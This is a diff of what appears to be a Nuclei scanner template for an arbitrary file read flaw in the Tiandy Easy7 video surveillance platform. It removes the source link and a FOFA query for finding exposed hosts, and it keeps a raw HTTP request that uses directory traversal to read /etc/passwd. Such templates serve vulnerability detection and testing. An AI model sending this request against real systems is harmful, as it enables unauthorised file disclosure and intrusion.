@@ -3,12 +3,8 @@ info:
   name: 天地伟业Easy7监控平台-downloadResource存在任意文件读取
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gtukaz8qud4wn49s'
+  description: ''
   tags: rce,lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gtukaz8qud4wn49s
-    fofa: app="Tiandy-Easy7"
 http:
 - raw:
   - 'GET /Easy7/rest/file/downloadResource?path=/../../../../../../../../etc/passwd HTTP/1.1
